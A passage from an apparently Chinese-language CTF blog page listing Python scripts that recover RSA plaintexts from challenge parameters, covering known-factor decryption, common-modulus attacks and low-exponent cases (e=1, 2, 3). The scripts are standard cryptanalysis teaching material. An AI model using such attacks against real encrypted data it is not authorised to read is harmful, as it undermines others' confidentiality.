class="number">966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533</span></span><br><span class="line"><span class="comment"># p 和 q通过在线网站http://factordb.com/index.php分解</span></span><br><span class="line">p = gmpy2.mpz(<span class="number">31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928797450473</span>)</span><br><span class="line">q = gmpy2.mpz(<span class="number">31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928997877221</span>)</span><br><span class="line">e = gmpy2.mpz(<span class="number">65537</span>)</span><br><span class="line">phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">c = gmpy2.mpz(<span class="number">168502910088858295634315070244377409556567637139736308082186369003227771936407321783557795624279162162305200436446903976385948677897665466290852769877562167487142385308027341639816401055081820497002018908896202860342391029082581621987305533097386652183849657065952062433988387640990383623264405525144003500286531262674315900537001845043225363148359766771033899680111076181672797077410584747509581932045540801777738548872747597899965366950827505529432483779821158152928899947837196391555666165486441878183288008753561108995715961920472927844877569855940505148843530998878113722830427807926679324241141182238903567682042410145345551889442158895157875798990903715105782682083886461661307063583447696168828687126956147955886493383805513557604179029050981678755054945607866353195793654108403939242723861651919152369923904002966873994811826391080318146260416978499377182540684409790357257490816203138499369634490897553227763563553981246891677613446390134477832143175248992161641698011195968792105201847976082322786623390242470226740685822218140263182024226228692159380557661591633072091945077334191987860262448385123599459647228562137369178069072804498049463136233856337817385977990145571042231795332995523988174895432819872832170029690848</span>)</span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(<span class="string">"十进制:\n%s"</span>%m)</span><br><span class="line">m_hex = hex(m)[<span class="number">2</span>:]</span><br><span class="line">print(<span class="string">"十六进制:\n%s"</span>%(m_hex,))</span><br><span class="line"><span class="comment">#print("ascII:\n%s"%((binascii.b2a_hex(hex(m)[2:])).decode('hex'),))</span></span><br><span class="line">print(<span class="string">"ascii:\n%s"</span>%(binascii.a2b_hex(m_hex).decode(<span class="string">"utf8"</span>),))</span><br></pre></td></tr></table></figure></p>
<p>以文件形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#power by jedi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment">#1.从公钥文件中分解n和e</span></span><br><span class="line">public_key = RSA.importKey(open(<span class="string">"./tmp/pubkey.pem"</span>).read())</span><br><span class="line">n = public_key.n</span><br><span class="line">e = public_key.e</span><br><span class="line"><span class="comment">#print("n=\n%s\ne=\n%s"%(n,e))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.在线分解n得到p和q</span></span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.计算出d</span></span><br><span class="line">d = int(gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br><span class="line"><span class="comment">#print(d)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过已知条件，生成私钥，并解密密文</span></span><br><span class="line">private_key = rsa.PrivateKey(n, e, d, p, q)<span class="comment">#生成私钥</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./tmp/flag.enc"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = rsa.decrypt(f.read(), private_key)</span><br><span class="line">    print(flag)</span><br><span class="line">    <span class="comment">#print(rsa.decrypt(f.read(), private_key).decode())</span></span><br></pre></td></tr></table></figure></p>
<h3 id="e-65537-已知cepq求m"><a href="#e-65537-已知cepq求m" class="headerlink" title="e=65537(已知cepq求m)"></a>e=65537(已知cepq求m)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(c,e,p,q)</span>:</span></span><br><span class="line">    L=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">    d=gmpy2.invert(e,L)</span><br><span class="line">    n=p*q</span><br><span class="line">    m=gmpy2.powmod(c,d,n)</span><br><span class="line">    flag=str(m)</span><br><span class="line">    print(<span class="string">"flag&#123;"</span>+flag+<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p =  <span class="number">31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928997877221</span></span><br><span class="line">    q =  <span class="number">31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928797450473</span></span><br><span class="line">    e =  <span class="number">65537</span></span><br><span class="line">    c =  <span class="number">168502910088858295634315070244377409556567637139736308082186369003227771936407321783557795624279162162305200436446903976385948677897665466290852769877562167487142385308027341639816401055081820497002018908896202860342391029082581621987305533097386652183849657065952062433988387640990383623264405525144003500286531262674315900537001845043225363148359766771033899680111076181672797077410584747509581932045540801777738548872747597899965366950827505529432483779821158152928899947837196391555666165486441878183288008753561108995715961920472927844877569855940505148843530998878113722830427807926679324241141182238903567682042410145345551889442158895157875798990903715105782682083886461661307063583447696168828687126956147955886493383805513557604179029050981678755054945607866353195793654108403939242723861651919152369923904002966873994811826391080318146260416978499377182540684409790357257490816203138499369634490897553227763563553981246891677613446390134477832143175248992161641698011195968792105201847976082322786623390242470226740685822218140263182024226228692159380557661591633072091945077334191987860262448385123599459647228562137369178069072804498049463136233856337817385977990145571042231795332995523988174895432819872832170029690848</span></span><br><span class="line">    Decrypt(c,e,p,q)</span><br></pre></td></tr></table></figure>
<h3 id="共模攻击-已知n-e1-e2-c1-c2求m"><a href="#共模攻击-已知n-e1-e2-c1-c2求m" class="headerlink" title="共模攻击(已知n,e1,e2,c1,c2求m)"></a>共模攻击(已知n,e1,e2,c1,c2求m)</h3><p>以文本形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展欧几里得算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  n = <span class="number">116547141139745534253172934123407786743246513874292261984447028928003798881819567221547298751255790928878194794155722543477883428672342894945552668904410126460402501558930911637857436926624838677630868157884406020858164140754510239986466552869866296144106255873879659676368694043769795604582888907403261286211</span></span><br><span class="line">  c1 = <span class="number">78552378607874335972488545767374401332953345586323262531477516680347117293352843468592985447836452620945707838830990843415342047337735534418287912723395148814463617627398248738969202758950481027762126608368555442533803610260859075919831387641824493902538796161102236794716963153162784732179636344267189394853</span></span><br><span class="line">  c2 = <span class="number">98790462909782651815146615208104450165337326951856608832305081731255876886710141821823912122797166057063387122774480296375186739026132806230834774921466445172852604926204802577270611302881214045975455878277660638731607530487289267225666045742782663867519468766276566912954519691795540730313772338991769270201</span></span><br><span class="line">  e1 = <span class="number">1804229351</span></span><br><span class="line">  e2 = <span class="number">17249876309</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line">  print(n2s(m))  <span class="comment"># 二进制转string</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure></p>
<p>以文件形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># 文件类型</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> g, x - b // a * y, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'flag.enc1'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        c1 = f1.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">        c1 = string.atoi(c1, base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'flag.enc2'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        c2 = f2.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">        c2 = string.atoi(c2, base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    n = <span class="number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L</span></span><br><span class="line"></span><br><span class="line">    e1 = <span class="number">17</span></span><br><span class="line">    e2 = <span class="number">65537</span></span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 求模反元素</span></span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = -s1</span><br><span class="line">        c1 = gmpy.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = -s2</span><br><span class="line">        c2 = gmpy.invert(c2, n)</span><br><span class="line"></span><br><span class="line">    m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'&#123;:x&#125;'</span>.format(int(m)).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<h3 id="已知n-e-c求m"><a href="#已知n-e-c求m" class="headerlink" title="已知n,e,c求m"></a>已知n,e,c求m</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastExpMod</span><span class="params">(b, e, m)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    e = e0*(2^0) + e1*(2^1) + e2*(2^2) + ... + en * (2^n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    b^e = b^(e0*(2^0) + e1*(2^1) + e2*(2^2) + ... + en * (2^n))</span></span><br><span class="line"><span class="string">        = b^(e0*(2^0)) * b^(e1*(2^1)) * b^(e2*(2^2)) * ... * b^(en*(2^n))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    b^e mod m = ((b^(e0*(2^0)) mod m) * (b^(e1*(2^1)) mod m) * (b^(e2*(2^2)) mod m) * ... * (b^(en*(2^n)) mod m) mod m</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (e&amp;<span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># ei = 1, then mul</span></span><br><span class="line">            result = (result * b) % m</span><br><span class="line">        e &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="comment"># b, b^2, b^4, b^8, ... , b^(2^n)</span></span><br><span class="line">        b = (b*b) % m</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(C, d, n)</span>:</span></span><br><span class="line">    <span class="comment">#RSA M = C^d mod n</span></span><br><span class="line">    <span class="keyword">return</span> fastExpMod(C, d, n)</span><br><span class="line"></span><br><span class="line">p = <span class="number">13574881</span></span><br><span class="line">q = <span class="number">23781539</span></span><br><span class="line">n = p * q</span><br><span class="line">fn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">23</span></span><br><span class="line">d = libnum.invmod(e,fn)</span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">C = int(<span class="string">'0xdc2eeeb2782c'</span>, <span class="number">16</span>)</span><br><span class="line">M = decryption(C, d, n)</span><br><span class="line">flag = str(hex(M))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> flag.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="已知n-c-e-1"><a href="#已知n-c-e-1" class="headerlink" title="已知n,c,e=1"></a>已知n,c,e=1</h3><p>文本形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N_hex=<span class="number">0x180be86dc898a3c3a710e52b31de460f8f350610bf63e6b2203c08fddad44601d96eb454a34dab7684589bc32b19eb27cffff8c07179e349ddb62898ae896f8c681796052ae1598bd41f35491175c9b60ae2260d0d4ebac05b4b6f2677a7609c2fe6194fe7b63841cec632e3a2f55d0cb09df08eacea34394ad473577dea5131552b0b30efac31c59087bfe603d2b13bed7d14967bfd489157aa01b14b4e1bd08d9b92ec0c319aeb8fedd535c56770aac95247d116d59cae2f99c3b51f43093fd39c10f93830c1ece75ee37e5fcdc5b174052eccadcadeda2f1b3a4a87184041d5c1a6a0b2eeaa3c3a1227bc27e130e67ac397b375ffe7c873e9b1c649812edcd</span></span><br><span class="line">e_hex=<span class="number">0x1</span></span><br><span class="line">c_hex=<span class="number">0x4963654354467b66616c6c735f61706172745f736f5f656173696c795f616e645f7265617373656d626c65645f736f5f63727564656c797d</span></span><br><span class="line"></span><br><span class="line">c_hex = gmpy2.mpz(c_hex)</span><br><span class="line">N_hex = gmpy2.mpz(N_hex)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">10</span>:</span><br><span class="line">    m_hex = hex(c_hex + gmpy2.mpz(hex(i))*N_hex)</span><br><span class="line">    print(m_hex[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(binascii.a2b_hex(m_hex[<span class="number">2</span>:]).decode(<span class="string">"utf8"</span>))</span><br><span class="line">    <span class="keyword">except</span> binascii.Error <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"位数非偶数，跳过..."</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h3 id="已知p-q-e-2"><a href="#已知p-q-e-2" class="headerlink" title="已知p,q,e=2"></a>已知p,q,e=2</h3><p>以文件形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># 适合e=2</span></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取公钥参数</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./tmp/pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line">    </span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./tmp/flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher = string.atoi(cipher, base=<span class="number">16</span>)</span><br><span class="line">    <span class="comment"># print cipher</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算yp和yq</span></span><br><span class="line">yp = gmpy.invert(p,q)</span><br><span class="line">yq = gmpy.invert(q,p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算mp和mq</span></span><br><span class="line">mp = pow(cipher, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">mq = pow(cipher, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算a,b,c,d</span></span><br><span class="line">a = (yp * p * mq + yq * q * mp) % N</span><br><span class="line">b = N - int(a)</span><br><span class="line">c = (yp * p * mq - yq * q * mp) % N</span><br><span class="line">d = N - int(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (a,b,c,d):</span><br><span class="line">    s = <span class="string">'%x'</span> % i</span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        s = <span class="string">'0'</span> + s</span><br><span class="line">    <span class="keyword">print</span> s.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="低加密指数e-3"><a href="#低加密指数e-3" class="headerlink" title="低加密指数e=3"></a>低加密指数e=3</h3><p>以文件形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">public_key = <span class="string">"./tmp/pubkey.pem"</span></span><br><span class="line">cipher_file = <span class="string">"./tmp/flag.enc"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#读入公钥</span></span><br><span class="line"><span class="keyword">with</span> open(public_key, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    n = key.n</span><br><span class="line">    e = key.e</span><br><span class="line"></span><br><span class="line"><span class="comment">#读入密文</span></span><br><span class="line"><span class="keyword">with</span> open(cipher_file, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read().encode(<span class="string">"hex"</span>)</span><br><span class="line">    cipher = int(cipher, <span class="number">16</span>)</span><br><span class="line">    <span class="comment">#print(cipher)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#破解密文</span></span><br><span 